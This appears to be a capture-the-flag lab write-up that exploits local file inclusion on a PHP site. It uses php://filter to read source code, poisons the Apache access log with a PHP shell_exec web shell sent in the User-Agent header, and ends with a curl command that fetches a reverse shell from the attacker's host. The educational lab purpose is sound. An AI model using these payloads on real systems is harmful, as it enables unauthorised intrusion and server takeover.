## Let's again try /etc/passwd
## We get another error message 

********PIC

## This says that there is no ‘/etc/passwd.php’ file
## It looks like the web server is adding '.php' to our request
<br>
{% highlight bash %}
"***Note
If we include a .php file we wont be able to see the actual PHP code since it runs on the server. 
A work-around is to use a handy PHP wrapper to base64 encode the file, then decode later"
{% endhighlight bash %}
## As php can only be viewed server side
## Let's add a base64 filter converter to view the output
{% highlight bash %}
add to URL= php://filter/convert.base64-encode/resource=
{% endhighlight bash %}

## Lets try the flag file again
{% highlight bash %}
http://<target_IP>/?view=php://filter/convert.base64-encode/resource=dog/../flag
{% endhighlight bash %}
## This outputs our flag in base64


********PIC

## We can use an online base64 decoder to quickly get the output:
### [base64decode.org/](https://www.base64decode.org/)
{% highlight bash %}
<?php
$flag_1 = "THM{REDACTED}"
?>
{% endhighlight bash %}
## The file is php, we confirm that is why it was not output originally

<br>
## Lets have a look at the index file
## Maybe we can bypass the .php extension from being added altogether
{% highlight bash %}
http://<target_IP>/?view=php://filter/convert.base64-encode/resource=dog/../index
{% endhighlight bash %}

<br>
## The following line is particularly interesting:
{% highlight bash %}
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
{% endhighlight bash %}
## There is an ‘ext’ parameter that specifies the file extention
## If it is not set then it will be .php by default. 
## This explains why .php is appended to all file requests.
<br>
## To bypass this we just add the &ext= parameter to the end
<br>
## We should have everything we need to bypass the filter now
{% highlight bash %}
"1. Include dog or cat
2. Add &ext= to the end of URL"
{% endhighlight bash %}
## We know that the Apache web server by default has an access log.
## We can view this log at: 
{% highlight bash %}
/?view=/dog/../../../../../../../../../var/log/apache2/access.log&ext=
{% endhighlight bash %}
## Notice how the User-Agent is being logged as well
## Using curl shows this clearly

********PIC

## We can intercept our request using BurpSuite
## Then replace the User-Agent in the header with PHP code
<br>
## Modify User Agent to upload "cmd command" ability:
{% highlight bash %}
GET /?view=/dog/../../../../../../../../../var/log/apache2/access.log&ext= HTTP/1.1

User-Agent:<?php echo shell_exec($_GET['cmd']) ?>
{% endhighlight bash %}

********PIC

## With this shell in the log file, 
## We can specify the ‘cmd’ parameter with a command we wish to execute. 
## for example:
{% highlight bash %}
http://<target>/?view=/dog/../../../../../../../../../var/log/apache2/access.log&ext=&cmd=whoami
{% endhighlight bash %}

## We can now use 'curl' to download a reverse shell onto the target
## I am using this [reverse shell from pentest monkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
<br>
## We will use the Python HTTP Server to host our PHP reverse shell:
{% highlight bash %}
$ python3 -m http.server 80
{% endhighlight bash %}

## And then download onto the victim machine:
{% highlight bash %}
http://<target_IP>/?view=./dog/../../../../var/log/apache2/access.log&ext=&cmd=curl <Your_IP>/php_monkey.php > hacked.php
{% endhighlight bash %}
<br>
